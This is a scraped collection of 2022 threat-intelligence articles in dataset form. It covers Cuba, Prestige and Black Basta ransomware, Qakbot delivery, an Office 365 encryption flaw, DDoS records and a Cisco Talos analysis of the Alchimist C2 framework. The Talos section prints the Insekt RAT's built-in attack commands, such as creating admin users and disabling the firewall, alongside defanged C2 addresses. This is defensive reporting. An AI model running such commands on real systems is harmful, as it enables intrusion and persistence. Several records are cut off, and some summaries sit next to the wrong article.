to interact with and disable antivirus software. For more information about Defender for Endpoint tamper protection, visit our docs page: Protect security settings with tamper protection . Microsoft Defender Antivirus provides event logging on attempted tampering of the product. This can include the disabling of services, such as Real Time Protection (Event ID: 5001). An alert will also be created within the Defender for Endpoint portal where customers have the ability to further triage the alert through the advanced hunting interface . Monitoring for the usage of the Windows PowerShell cmdlet can also help discover instances of anti-virus tampering. Figure 24. Sample command to look for antivirus tampering Remote desktop protocol DART was able to detect actor RDP connections through anomalous connections. These anomalous connections include: Domain administrators logging into multiple servers for the first time, and Domain administrators initiating RDP connections from abnormal locations. Domain and enterprise administrator logons should be audited for anomalous connections, including connections originating from edge servers or onto servers that they do not usually administrate. Multifactor authentication (MFA) should be enforced for administrator accounts. Conclusion Ransomware groups continue to grow in sophistication through the increasing hibernation times before encryption, large varieties of persistent access and the use of legitimate signed binaries. These groups continue to target sensitive data for exfiltration, with some groups returning to the network post-encryption to ensure they maintain a foothold on the network. Networks must remain vigilant hunting for these TTPs and anomalous behaviors. The Cuba ransomware group used a large variety of living of the land techniques to help evade detection by antivirus products. This requires a stronger focus on anomaly and behavioral detections for hunting on a network, rather than standard malicious file detection. Software auditing of remote access tools and remote execution tools, such as PsExec and SSH, should be regularly evaluated. Microsoft strongly recommends focusing on the following actions to help improve your network’s security posture: Enabling tamper protection on antivirus products. Triage high severity antivirus and EDR alerts within a timely manner, including tampering alerts. Enable MFA and monitoring for administration accounts. Monitoring anomalies in service and scheduled task creation.

The development marks the first time the nascent adversary simulation software is being delivered via a Qakbot infection, cybersecurity firm Trend Micro said in a technical analysis released last week. The intrusion, achieved using a phishing email containing a weaponized link pointing to a ZIP archive, further entailed the use of Cobalt Strike for lateral movement. While these legitimate utilities are designed for conducting penetration testing activities, their ability to offer remote access has made them a lucrative tool in the hands of attackers looking to stealthily probe the compromised environment without attracting attention for extended periods of time. This has been compounded by the fact that a cracked version of Brute Ratel C4 (BRc4 v1.2.2) began circulating last month across the cybercriminal underground, prompting its developer to update the licensing algorithm to make it harder to crack. Qakbot , also called QBot and QuackBot, is an information stealer and banking trojan that's known to be active since 2007. But its modular design and its ability to act as a downloader has turned it into an attractive candidate for dropping additional malware. According to Trend Micro, the ZIP file in the email contains an ISO file, which, in turn, includes a LNK file that fetches the Qakbot payload, illustrating attempts on part of threat actors to adapt to other tactics in the aftermath of Microsoft's decision to block macros by default for documents downloaded from the web. The Qakbot infection is succeeded by the retrieval of Brute Ratel and Cobalt Strike, but not before performing automated reconnaissance through built-in command line tools such as arp, ipconfig, nslookup, netstat, and whoami. The attack, however, was stopped before any malicious action could be taken by the threat actor, although it's suspected that the end goal may have been domain-wide ransomware deployment. In another Qakbot execution chain spotted by the cybersecurity company, the ZIP file is delivered through an increasingly popular method called HTML smuggling , resulting in the execution of Brute Ratel C4 as the second-stage. ""The Qakbot-to-Brute Ratel-to-Cobalt Strike kill chain is associated with the group behind the Black Basta Ransomware,"" the researchers said. ""This is based on overlapping TTPs and infrastructure observed in Black Basta attacks."" The findings coincide with a resurgence of Qakbot attacks in recent months by means of a variety of techniques like HTML file attachments , DLL side-loading , and email thread hijacking , the last of which entailed harvesting emails in bulk from successful ProxyLogon attacks aimed at Microsoft Exchange servers. Qakbot is far from the only access-as-a-service malware that's being increasingly distributed via ISO and other file formats to get around macro restrictions, for Emotet , IcedID , and Bumblebee campaigns have all followed similar trajectories. Palo Alto Networks Unit 42, in late September 2022, said it discovered a malicious polyglot Microsoft Compiled HTML Help (CHM) file being used to deliver the IcedID (aka BokBot) malware. Other prominent delivery methods and infection pathways have involved the use of password-protected ZIP files containing an ISO file, mirroring that of Qakbot, with the payload propagated through a pay-per-installer service known as PrivateLoader , according to Team Cymru . And, to top it all, Emotet appears to be readying for a fresh set of attacks after a short three-month hiatus to rework its ""systeminfo"" module to ""improve targeting of specific victims and distinguish tracking bots from real users,"" ESET disclosed in a series of tweets. ""We have not seen new spam waves from Emotet since July,"" Jean-Ian Boutin, director of threat research at ESET, told The Hacker News. ""It is not clear why that is."" ""They did take some breaks in the past, but never for that long. Perhaps this new module means that they are testing modules and will be active again in the near future, but this of course is speculation.""",['Malware'],0779d862-8e3d-5305-957e-48d1ba55bdcd,"The threat actors behind the Black Basta ransomware family have been observed using the Qakbot trojan to deploy the Brute Ratel C4 framework as a second-stage payload in recent attacks.

""The activity shares victimology with recent Russian state-aligned activity, specifically on affected geographies and countries, and overlaps with previous victims of the FoxBlade malware (also known as HermeticWiper),"" the Microsoft Threat Intelligence Center (MSTIC) said . The tech giant remarked the intrusions occurred within an hour of each other across all victims, attributing the infections to an unnamed cluster called DEV-0960. It did not disclose the scale of the attacks, but stated it's notifying all affected customers. The campaign is also believed to be distinct from other recent destructive attacks that have involved the use of HermeticWiper and CaddyWiper , the latter of which is launched by a malware loader called ArguePatch (aka AprilAxe). The method of initial access remains unknown, with Microsoft noting that the threat actor had already obtained privileged access to the compromised environment to deploy the ransomware using three different methods. In a related development, Fortinet FortiGuard Labs took the wraps off a multi-stage attack chain that leverages a weaponized Microsoft Excel document, which masquerades as a spreadsheet for generating salaries for Ukrainian military personnel to drop Cobalt Strike Beacon. ""The threat landscape in Ukraine continues to evolve, and wipers and destructive attacks have been a consistent theme,"" Redmond noted. ""Ransomware and wiper attacks rely on many of the same security weaknesses to succeed."" The findings come amid an explosion of relatively new ransomware strains that have been gaining traction on the threat landscape, including that of Bisamware, Chile Locker , Royal , and Ransom Cartel , over the past few months. Ransom Cartel, which surfaced in mid-December 2021, is also notable for sharing technical overlaps with REvil ransomware , which shut shop in October 2021 following immense law enforcement scrutiny into its operations after a string of high-profile attacks on JBS and Kaseya. It's suspected that ""Ransom Cartel operators had access to earlier versions of REvil ransomware source code,"" Palo Alto Networks Unit 42 observed on October 14, stating that ""there was a relationship between the groups at some point, though it may not have been recent."" REvil, earlier this January, suffered further setback when Russian authorities arrested multiple members, but there are indications that the notorious cybercrime cartel may have staged a return in some form. Cybersecurity firm Trellix, in late September, also revealed how a ""disgruntled internal source"" from the group shared details about the adversary's Tactics, Techniques and Procedures (TTPs), lending a crucial insight into the ""relationships and inner workings of REvil and its members."" It's not just REvil that's back on the ransomware radar. HP Wolf Security last week said it isolated a Magniber campaign that has been found targeting Windows home users with fake security updates which employ a JavaScript file to proliferate the file-encrypting malware. ""The attackers used clever techniques to evade protection and detection mechanisms,"" malware analyst Patrick Schläpfer pointed out. ""Most of the infection chain is 'fileless,' meaning the malware only resides in memory, reducing the chances of it being detected.""",['Malware'],59398155-2269-5224-bdf4-56e7cee32db1,"A new ransomware campaign targeted the transportation and logistics sectors in Ukraine and Poland on October 11 with a previously unknown payload dubbed Prestige. “The activity shares victimology with recent Russian state-aligned activity, specifically on affected geographies and countries, and overlaps with previous victims of the FoxBlade malware (also known as HermeticWiper),"" the Microsoft Threat Intelligence Center (MSTIC) said.

""The [Office 365 Message Encryption] messages are encrypted in insecure Electronic Codebook ( ECB ) mode of operation,"" Finnish cybersecurity company WithSecure said in a report published last week. Office 365 Message Encryption (OME) is a security mechanism used to send and receive encrypted email messages between users inside and outside an organization without revealing anything about the communications themselves. A consequence of the newly disclosed issue is that rogue third-parties gaining access to the encrypted email messages may be able to decipher the messages, effectively breaking confidentiality protections. Electronic Codebook is one of the simplest modes of encryption wherein each message block is encoded separately by a key, meaning identical plaintext blocks will be transposed into identical ciphertext blocks, making it unsuitable as a cryptographic protocol. Indeed, the U.S. National Institute of Standards and Technology (NIST) pointed out earlier this year that ""ECB mode encrypts plaintext blocks independently, without randomization; therefore, the inspection of any two ciphertext blocks reveals whether or not the corresponding plaintext blocks are equal."" That said, the shortcoming identified by WithSecure doesn't relate to the decryption of a single message per se, but rather banks on analyzing a stash of encrypted stolen mails for such leaky patterns and subsequently decoding the contents. ""An attacker with a large database of messages may infer their content (or parts of it) by analyzing relative locations of repeated sections of the intercepted messages,"" the company said. The findings add to growing concerns that encrypted information previously exfiltrated may be decrypted and exploited for attacks in the future, a threat called ""hack now, decrypt later,"" fueling the need to switch to quantum-resistant algorithms . Microsoft, for its part, considers OME as a legacy system , with the company recommending customers to use a data governance platform called Purview to secure emails and documents via encryption and access controls. ""Even though both versions can coexist, we highly recommend that you edit your old mail flow rules that use the rule action Apply the previous version of OME to use Microsoft Purview Message Encryption,"" Redmond notes in its documentation. ""Since Microsoft has no plans to fix this vulnerability the only mitigation is to avoid using Microsoft Office 365 Message Encryption,"" WithSecure said.",['Malware'],53245212-6072-527e-bf10-507e181a4767,"A security vulnerability in Microsoft 365 could be exploited to infer message contents due to the use of a broken cryptographic algorithm.

CEO David Koczkar said no customer data was taken and that the insurer had since brought its customer-facing systems back online. It had taken some systems offline immediately after monitoring systems detected the “unusual activity”. “We have contained the ransomware threat but remain vigilant and will take the necessary steps in the future to protect our operations and customer data,"" Koczkar said. In a brief chronology of events, Medibank said it first detected “unusual activity” on its servers on Wednesday last week, leading its cyber security team to commence incident response, with the support of partners. “Later that evening, we identified the unusual activity was focused on the IT infrastructure we use to support our ahm and international student customer policy management systems.” Medibank made the decision to temporarily block and isolate access to the two systems and entered into a trading halt while the activity was investigated, Koczkar said. The customer-facing systems “were restored on new IT infrastructure” enabling business to resume as usual by Friday last week. He added Medibank started to communicate with its customers via emails and texts on the Thursday, to keep them informed about the incident. Answering questions from investors, Koczkar said Medibank is aware of how attackers were able to gain access to its systems. “We believe ... one [set] of our credentials was compromised, but we've got an ongoing investigation into exactly what happened,"" he said. ""We've taken all necessary steps to address this.” He said the company found no evidence of access to customer data “but that is subject to our continuing forensic analysis”. He said Medibank is “very happy with how we sit in terms of our ability to respond to a cyber incident” but noted the incident will lead to “some learnings”. Koczkar said no significant costs related to the incident are expected. He thanked the Australian Cyber Security Centre (ACSC), regulators and government departments ""who have contributed to and supported our response and work so effectively with us.” “We will also share technical information with our peers as part of our commitment to helping others understand this incident and allow them to bolster their own defences,"" he said.

As the Internet and website development advanced and became more accessible, the number of sites offering software cracking tools grew. Our research team recently searched the Web for websites that peddle cracks and keygens in an attempt to add more artifacts to publicly available lists of indicators of compromise (IoCs). We used 39 domains identified as IoCs as a starting point and found: A sample of the additional artifacts obtained from our analysis is available for download from our website . Our research team collated 39 domains known for hosting malicious crack and keygen sites. Accessing any of these is harmful to corporate network-connected users in that the activity could lead to malware infection. Worse than that, however, using cracked software is illegal and companies that allow employees to use them could be fined as much as US$150,000 if proven to have committed software piracy in the U.S. As part of our ongoing effort to make the Internet safer, we sought to identify other threat artifacts aided by WHOIS, DNS, and IP intelligence. We began by subjecting the IoCs to DNS lookups, which led to the discovery of 500 IP addresses to which they resolved. Based on the results, most of the crack and keygen sites pointed to the U.S., Netherlands, Germany, Canada, China, and France. We then looked at the IoCs’ historical WHOIS records and uncovered 15 unredacted email addresses used to register them. Most of them were Gmail accounts, which isn’t surprising since anyone can easily obtain one. Using the IP addresses and email addresses as reverse WHOIS search terms to find more artifacts provided us with 152 additional domains. A closer look at them pointed to seven that may be crack and keygen sites—crack[.]ws, crack[.]ms, netcrack[.]com, crackway[.]com, serials[.]ws, serialsource[.]net, and serialdevil[.]com. The sites’ screenshots showed that four were parked or up for sale, one led to a blank page, one was unreachable, and one—serials[.]ws—was indeed a crack and keygen site. We then wanted to know if crack and keygen site creation remains popular to this day. So, we searched for domains registered just this year and using strings commonly included in crack and keygen site names, namely “crack,” “keygen,” and “serial.” The searches gave us 6,563 domains containing “crack,” 141 domains containing “keygen,” and 1,771 domains containing “serial.” A bulk malware check via Threat Intelligence Platform (TIP) for the 6,500+ domains showed that 81 of them were malicious. Below are examples of the malicious crack and keygen sites. Exhaustive threat intelligence can help security teams uncover more malicious web properties than those that appear on publicly available lists of IoCs. Our IoC expansion study also showed that cracks and keygens remain an issue given the thousands of domains pointing to websites that sell them registered just this year.

635124b728e9d467ce4282fc,microsoft,https://www.microsoft.com/security/blog/2022/10/14/new-prestige-ransomware-impacts-organizations-in-ukraine-and-poland/,New “Prestige” ransomware impacts organizations in Ukraine and Poland,Microsoft Security Threat Intelligence,2022-10-14,"The Microsoft Threat Intelligence Center (MSTIC) has identified evidence of a novel ransomware campaign targeting organizations in the transportation and related logistics industries in Ukraine and Poland utilizing a previously unidentified ransomware payload. We observed this new ransomware, which labels itself in its ransom note as “Prestige ranusomeware”, being deployed on October 11 in attacks occurring within an hour of each other across all victims. This campaign had several notable features that differentiate it from other Microsoft-tracked ransomware campaigns: The enterprise-wide deployment of ransomware is not common in Ukraine, and this activity was not connected to any of the 94 currently active ransomware activity groups that Microsoft tracks The Prestige ransomware had not been observed by Microsoft prior to this deployment The activity shares victimology with recent Russian state-aligned activity, specifically on affected geographies and countries, and overlaps with previous victims of the FoxBlade malware (also known as HermeticWiper) Despite using similar deployment techniques, the campaign is distinct from recent destructive attacks leveraging AprilAxe (ArguePatch)/CaddyWiper or Foxblade (HermeticWiper) that have impacted multiple critical infrastructure organizations in Ukraine over the last two weeks. MSTIC has not yet linked this ransomware campaign to a known threat group and is continuing investigations. MSTIC is tracking this activity as DEV-0960. Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing MSTIC to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor or merged with existing actors. This blog aims to provide awareness and indicators of compromise (IOCs) to Microsoft customers and the larger security community. Microsoft continues to monitor this and is in the process of early notification to customers impacted by DEV-0960 but not yet ransomed. MSTIC is also actively working with the broader security community and other strategic partners to share information that can help address this evolving threat through multiple channels. Observed actor activity Pre-ransomware activities Prior to deploying ransomware, the DEV-0960 activity included the use of the following two remote execution utilities: RemoteExec – a commercially available tool for agentless remote code execution Impacket WMIexec – an open-source script-based solution for remote code execution To gain access to highly privileged credentials, in some of the environments, DEV-0960 used these tools for privilege escalation and credential extraction: winPEAS – an open-source collection of scripts to perform privilege escalation on Windows comsvcs.dll – used to dump the memory of the LSASS process and steal credentials ntdsutil.exe – used to back up the Active Directory database, likely for later use credentials Ransomware deployment In all observed deployments, the attacker had already gained access to highly privileged credentials, like Domain Admin, to facilitate the ransomware deployment. Initial access vector has not been identified at this time, but in some instances it’s possible that the attacker might have already had existing access to the highly privileged credentials from a prior compromise. In these instances, the attack timeline starts with the attacker already having Domain Admin-level access and staging their ransomware payload. Most ransomware operators develop a preferred set of tradecraft for their payload deployment and execution, and this tradecraft tends to be consistent across victims, unless a security configuration prevents their preferred method. For this DEV-0960 activity, the methods used to deploy the ransomware varied across the victim environments, but it does not appear to be due to security configurations preventing the attacker from using the same techniques. This is especially notable as the ransomware deployments all occurred within one hour. The distinct methods for ransomware deployment were: Method 1: The ransomware payload is copied to the ADMIN$ share of a remote system, and Impacket is used to remotely create a Windows Scheduled Task on target systems to execute the payload Method 2: The ransomware payload is copied to the ADMIN$ share of a remote system, and Impacket is used to remotely invoke an encoded PowerShell command on target systems to execute the payload Method 3: The ransomware payload is copied to an Active Directory Domain Controller and deployed to systems using the Default Domain Group Policy Object Malware analysis The “Prestige” ransomware requires administrative privileges to run. Like many ransomware payloads, it attempts to stop the MSSQL Windows service to ensure successful encryption using the following command (the strings “C:\Windows\System32\net.exe stop” and “MSSQLSERVER” are both hardcoded in the analyzed samples): Prestige creates C:\Users\Public\README and stores the following ransom note in the file. The same file is also created in the root directory of each drive: Prestige ransom note Prestige then traverses the files on the file system and encrypts the contents of files that have one of the following hardcoded file extensions, avoiding encrypting files in the C:\Windows\ and C:\ProgramData\Microsoft\ directories: After encrypting each file, the ransomware appends the extension .enc to the existing extension of the file. For example, changes.txt is encrypted and then renamed to changes.txt.enc . Prestige uses the following two commands to register a custom file extension handler for files with .enc file extension: Custom file extension handler for files with .enc extension As a result of creating the custom file extension handler, when any file carrying the file extension .enc (i.e., encrypted by Prestige) is opened by a user, the file extension handler uses Notepad to open C:\Users\Public\README , which contains the ransom note. To encrypt files, Prestige leverages the CryptoPP C++ library to AES-encrypt each eligible file. During the encryption process, the following hardcoded RSA X509 public key is used by one version of the ransomware (each version of Prestige may carry a unique public key): To hinder system and file recovery, Prestige runs the following command to delete the backup catalog from the system: Prestige also runs the following command to delete all volume shadow copies on the system: Before running the commands above, the 32-bit version of Prestige calls the function Wow64DisableWow64FsRedirection() to disable file system redirection and gain access to the native System32 directory. After running the commands above, Prestige restores file system redirection by calling the function Wow64RevertWow64FsRedirection() . Microsoft will continue to monitor DEV-0960 activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. Looking forward The threat landscape in Ukraine continues to evolve, and wipers and destructive attacks have been a consistent theme. Ransomware and wiper attacks rely on many of the same security weaknesses to succeed. As the situation evolves, organizations can adopt the hardening guidance below to help build more robust defenses against these threats. Recommended customer actions The ransomware payload was deployed by the actor after an initial compromise that involved gaining access to highly privileged credentials. The techniques used by the actor and described in the “Observed Actor Activity” section can be mitigated by adopting the security considerations provided below: Block process creations originating from PSExec and WMI commands to stop lateral movement utilizing the WMIexec component of Impacket. Enable Tamper protection to prevent attacks from stopping or interfering with Microsoft Defender. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants. While this attack differs from traditional ransomware, following our defending against ransomware guidance helps protect against the credential theft, lateral movement, and ransomware deployment used by DEV-0960. Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion. Enable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity, including VPNs. Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator to secure your accounts.

Characterizing it as a ""multi-vector attack consisting of UDP and TCP floods,"" researcher Omer Yoachimik said the DDoS attack targeted the Minecraft server Wynncraft in Q3 2022. ""The entire 2.5 Tbps attack lasted about 2 minutes, and the peak of the 26 million rps attack [was] only 15 seconds,"" Yoachimik noted . ""This is the largest attack we've ever seen from the bitrate perspective."" Cloudflare also pointed to a surge in multi-terabit DDoS attacks as well as longer-lasting volumetric attacks during the time period, not to mention an uptick in attacks targeting Taiwan and Japan. The disclosure comes almost 10 months after Microsoft said it thwarted a record-breaking 3.47 Tbps DDoS attack in November 2021 directed against an unnamed Azure customer in Asia. Other DDoS attacks of this scale and volume include a 2.5 Tbps DDoS attack absorbed by Google in September 2017 and a 2.3 Tbps volumetric strike aimed at Amazon Web Services in February 2020. What's more, ransom DDoS attacks – in which the threat actor demands monetary compensation to stop the attack – have witnessed a 15% increase quarter-over-quarter and a 67% jump year-over-year. Application-layer DDoS attacks (aka HTTP DDoS attacks), on the other hand, have singled out companies in the U.S., China, and Cyprus, with most of the attacks originating from China, India, and the U.S. Ukraine, which has been heavily pummeled by DDoS attacks since the start of the Russo-Ukrainian war, has had its marketing, education, and government sectors targeted the most during Q3, in contrast to attacks on media companies the previous two quarters. Likewise, network-layer DDoS attacks (aka Layer 3 DDoS attacks) predominantly were recorded against gaming, telecom, IT services sectors located in Singapore, U.S., and China. A noteworthy trend highlighted by Cloudflare is a 1,221% QoQ increase in DDoS attacks that leverage the BitTorrent communication protocol, which is traditionally used for peer-to-peer (P2P) file sharing. ""Over the years, it has become easier, cheaper, and more accessible for attackers and attackers-for-hire to launch DDoS attacks,"" Yoachimik said. The disclosure also comes as application performance management company Netscout revealed that threat actors are increasingly experimenting with different DDoS attack vectors such as carpet bombing and DNS water torture attacks.",['Malware'],7b914b32-bc24-5451-aeb1-c37551b30926,"Cloudflare halted a 2.5 Tbps distributed denial-of-service (DDoS) attack launched by a Mirai botnet that hit Minecraft server Wynncraft in Q3 2022. “This is the largest attack we've ever seen from the bitrate perspective."""

635124b628e9d467ce4282eb,ciscotalos,https://blog.talosintelligence.com/2022/10/alchimist-offensive-framework.html,"Alchimist: A new attack framework in Chinese for Mac, Linux and Windows",Chetan Raghuprasad,2022-10-13,"By Chetan Raghuprasad , Asheer Malhotra and Vitor Ventura , with contributions from Matt Thaxton. Cisco Talos discovered a new attack framework including a command and control (C2) tool called ""Alchimist"" and a new malware ""Insekt"" with remote administration capabilities. The Alchimist has a web interface in Simplified Chinese with remote administration features. The attack framework is designed to target Windows, Linux and Mac machines. Alchimist and Insekt binaries are implemented in GoLang. This campaign consists of additional bespoke tools such as a MacOS exploitation tool, a custom backdoor and multiple off-the-shelf tools such as reverse proxies. Cisco Talos has discovered a new single-file command and control (C2) framework the authors call ""Alchimist [sic]."" Talos researchers found this C2 on a server that had a file listing active on the root directory along with a set of post-exploitation tools. Cisco Talos assesses with moderate-high confidence that this framework is being used in the wild. ""Alchimist"" is a 64-bit Linux executable written in GoLang and packed with assets including resources for the web interface and Insekt RAT payloads compiled for Windows and Linux. Insekt RAT, a new trojan Cisco Talos discovered, is Alchimist's beacon implant written in GoLang and has a variety of remote access capabilities that can be instrumented by the Alchimist C2 server. Alchimist C2 has a web interface written in Simplified Chinese and can generate a configured payload, establish remote sessions, deploy payload to the remote machines, capture screenshots, perform remote shellcode execution and run arbitrary commands. Among the remaining tools, Cisco Talos found a Mach-O dropper embedded with an exploit to target a known vulnerability CVE-2021-4034 , a privilege escalation issue in polkit's pkexec utility, and a Mach-O bind shell backdoor. The Qualys Research Team discovered CVE-2021-4034 in November 2021, and in January 2022, the U.S.'s National Security Agency Cybersecurity Director warned that the vulnerability was being exploited in the wild. The server also contained dual-use tools like psexec and netcat, along with a scanning tool called ""fscan,"" which the author defines as an ""intranet scanning tool,"" essentially all the necessary tools for lateral movement. Alchimist framework The attack framework we discovered during the course of this research consists of a standalone C2 server called ""Alchimist"" and its corresponding implants the authors call the ""Insekt"" RAT family. Alchimist isn't the first self-contained framework we've discovered recently, with Manjusaka being another single file-based C2 framework disclosed by Talos recently. Both follow the same design philosophy, albeit implemented in different ways, to the point where they both seem to have the same list of requirements despite being implemented by different programmers. However, Manjusaka and Alchimist have virtually the same set of features. They both have been designed and implemented to operate as standalone GoLang-based executables that can be distributed with relative ease to operators. The frameworks inside carry the implants and the whole web user interface. The implant configuration is defined using the Web UI (Web User Interface), which in both cases is completely written in Simplified Chinese. Also, they both mention the uncommon protocol SNI in one case already supported (Alchimist), with plans to support it in the other (Manjusaka). The main differences lie in the approaches taken to implement the Web UI and the way the frameworks implement the single-file feature. Manjusaka developers take advantage of the Gin web framework and use packr , an asset bundling framework, to embed and store the implants. Alchimist authors took a more basic approach, using only the basic GoLang features to implement the same features. There are also differences in the implant code, but functionality-wise, they are pretty similar, as they implement the features made available by the C2. We've observed that Alchimist, apart from the regular HTTP/S also supports protocols like SNI, WSS/WS, Manjusaka on the other hand, mentions SNI, WSS/WS on its documentation but only supports HTTP. Unwrapping Alchimist Assets Alchimist uses GoLang-based assets (custom-made embedded packages) to store all the resources required for it to function as a C2 server. During the initialization of the C2 service, the process extracts all the embedded assets from the GoLang-based ELF binary of the C2 and drops them into hardcoded locations under the /tmp/Res/ directory. C2 ELF contains hardcoded destination directories for dropping the embedded assets. All embedded assets are recursively placed in directories based on the way they are embedded in the GoLang asset package. Alchimist C2's asset extraction and write-to-file functionality. The ""Res"" directory contains web interface code, HTML files and other directories. It also unpacks its ""Insekt"" implant binaries, for the Windows and Linux operating systems into the ""/tmp/Res/Payload"" directory. In the /tmp directory, the C2 also writes the self-signed certificate and the key used in HTTPS communications. Even though it is self-signed, the certificate is not generated upon execution. Rather, it is a hardcoded certificate added to the C2 at the time of compilation. The details of the certificate below also shows that the certificate doesn't contain any server name. The web interface is written in Simplified Chinese, presenting several options to the operators. Index page view of the Alchimist web interface. A detailed look into the Web UI shows features it supports all the common features one would expect in a RAT's C2. One, however, stood out: The ability to generate PowerShell and wget code snippets for Windows and Linux, respectively. An attacker could use these commands to build their infection mechanism for distributing Insekt RAT. An attacker can embed these commands in a script (instrumented via a malicious entry point such as a maldoc, LNK, etc.) and deliver it to the victims by various means to gain an initial foothold, thereby downloading and implanting the Insekt RAT. Delivery command snippets generated by Alchimist for Insekt payloads. Payload generation Alchimist accepts several parameters from the Web UI for generating a payload. This operator inputs the parameters into the ""session[.]html"" Web UI and consists of the following configuration: Protocol value: TLS, SNI, WSS/WS. Remote C2 host IP/URL. Platform type: Windows or Linux to select the type of Insekt RAT payload. Daemon flag: Indicates if the Insekt implant runs as a daemon on the infected endpoint. Predomain value: For the SNI protocol type only. The Web UI will take these configuration values to construct a JSON and send a POST request to the ""/pay"" URL of the current C2 server to request a new payload that can be downloaded. Web UI HTML code requesting the payload generation from the C2. The request for generating the payload hits the ""/pay"" URL, where the C2 accepts the configuration parameters from the JSON, parses them and then generates the customized Insekt payload. The C2 doesn't compile the Insekt payloads (also GoLang based) at all. It simply reads a dummy/skeleton Insekt binary (winx64 or ELFx64) that was unpacked during its initialization from the ""/tmp/Res/Payloads/"" directory into memory and hot patches the Insket binary in memory based on specific placeholder flags for the various values and dumps the patched Insekt binary to disk again. This new binary is then read from the disk by another helper routine in the C2 process and served to the operator via the Web UI. C2 is looking to patch the C2 server value ${RHOST} in the Insekt dummy binary. Communication protocol The communication logic with the Windows and Linux Insekt variants is similar. The communication is managed by the ""pm3"" GoLang package which implements establishing and managing connections to the WebSockets, plugin codes to scan IP addresses using the ICMP protocol, utility code to perform port forwarding, upload files to the remote machine and perform remote execution. The C2 address is hard-coded on the implant at configuration time, which attempts to connect to the C2 server 10 times with an interval of one second. After ten unsuccessful attempts, the backdoor pauses and again attempts to connect to the C2 server once every hour. Implant initiating the connection to the C2 server. The implant supports connecting to the C2 over either WSS/WS, TLS or SNI protocols. Communication mechanisms for various protocols. Based on the C2 URLs specified, the implant will use a specific protocol to initiate the check-in with the C2 server. Implant selects the right protocol to check in and talk to the C2. Insekt implant Insekt is a 64-bit implant written in GoLang, compiled for Windows and Linux environments with a variety of RAT capabilities, all directed to execute by the Alchimist C2 server. During initialization, the implant will set up multiple handlers for seven primary capabilities: Get file sizes. Get OS information. Run arbitrary commands via cmd[.]exe. Upgrade the current Insekt implant. Run arbitrary commands as a different user. Sleep for periods of time defined by the C2. Start/stop taking screenshots. Major Insekt capabilities. Insekt also checks the internet connectivity and port status by connecting to the addresses/ports below. Host Port localhost 22 localhost 80 localhost 23 localhost 445 localhost 139 www[.]google[.]com 443 www[.]apple[.]com 443 github[.]com 443 Apart from these capabilities, the implant consists of other capabilities such as shellcode execution, port and IP scanning, SSH key manipulation, proxying connections, etc. described below. Both variants can execute arbitrary commands on the operating system shell, upon request from the operators. The Linux variant of Insekt also has the functionality to list the contents of "".ssh"" directory in the victim's home directory and adds new SSH keys to the authorised_Keys file. Using this feature, the attacker can communicate with the victim's machine from the C2 over SSH. From the network point-of-view, Insekt can create ""proxy"" connections to other systems by its own mechanism or by simply using the socks5 protocol. Insekt also includes a module that implements the different commands that can be issued by the operators. In particular, it implements interactive shells based on PowerShell, bash and cmd[.]exe. It also has the ability to accept command codes from the Alchimist C2 to execute a predefined set of commands on the victim system. The table below lists such commands. Command Action Description ${add_user} net user add {user} /random /add Creates a user [T1136] ${add_admin} net localgroup administrators {user} /add Assign privileges [T1136] ${domain_ls} net user /domain List users in domain [T1087/002] ${domain_show} net group ""domain admins"" /domain List domain administrators [T1087/002] ${dc} net group ""domain controllers"" /domain List domain controllers [T1087/002] ${2003_rdp_reg} “hklm/system/CurrentControlSet/Control/Terminal Server"" /v fDenyTSConnections Activate terminal services [T1021/001] ${close_firewall} netsh firewall set opmode mode=disable Disable firewall [T1562/004] ${in-port-allow-tcp} netsh advfirewall firewall add rule name=\""Allow port\"" dir=in action=allow protocol=TCP localport={port} Change firewall rules to allow incoming connections on a specific tcp port [T1562/004] A module named ""Command Line Interface (CLI)"" in Insekt contains RAT styled capability implementations — command codes and data received from the C2 — for carrying out specific RAT actions on the infected endpoint. These capabilities consist of: Change directory - cd. Write files to disk. Execute arbitrary commands. Scan IPs. Scan specific ports for an IP. Enumerate file in a directory path. Download files from a remote location. Unzip archive files to a location on disk. RAT command indexes and decision tree. Other tools Along with Alchimist, Cisco Talos also found tools for the elevation of privileges and eventual exploitation of MacOSX platforms. Talos found two tools whose source code can be found on GitHub: Fast reverse proxy ( frp ), which can be used for data exfiltration and Fscan , an intranet-scanning tool. MacOSX exploitation The Mach-O file discovered in the open directory is a 64-bit executable written in GoLang embedded with an exploit and a bind shell backdoor. The dropper contains an exploit for a privilege escalation vulnerability ( CVE-2021-4034 ) in polkit's pkexec utility. However, this utility is not installed on MacOSX by default, meaning the elevation of privileges is not guaranteed. Along with the exploit, the dropper would bind a shell to a port providing the operators with a remote shell on the victim machine. The same exploit was also found for Linux. Scriptlet Alchimist can generate scripts to be used in the first stage of infections. One of these scripts was found with the name ""down[.]sct."" The script launches a WScript[.]shell object to run a PowerShell command and download the Insekt implant from http[://]45[.]32[.]132[.]166/msconfig[.]zip. Shellcode A meterpreter shellcode was found on a file with the name shell.msi. It has the malicious configuration containing the host and the port details for the shell code to connect to 18[.]167[.]90[.]252, providing Talos with one more piece of the operator's infrastructure. Infrastructure Malicious Infrastructure The web archive scans report of the host 45[.]32[.]132[.]166 showed us that it had an open directory in January 2022, but it was offline at the time of our analysis. Command and control The certificate shows the serial number — 61b0feca645af9296aa422d2c289e1d13593dbb6 — and fingerprint — 134a3d105eef24fab27ed0fb3729e271306bde6dc4e9d2a4a5c5d1c82b0390fe — we discovered five hosts containing the same certificate: 149[.]28[.]54[.]212 95[.]179[.]246[.]73 149[.]28[.]36[.]160 45[.]76[.]68[.]112 3[.]86[.]255[.]88 Our analysis revealed that the backdoors communicated over HTTPS to the server 149[.]28[.]54[.]212 and the Alchimist user interface was accessible via ports 8443 and 50423 from the servers 149[.]28[.]54[.]212, 95[.]179[.]246[.]73, and 149[.]28[.]36[.]160. The rise of all-inclusive C2 frameworks Our discovery of Alchimist is yet another indication that threat actors are rapidly adopting off-the-shelf C2 frameworks to carry out their operations. A similar ready-to-go C2 framework called "" Manjusaka 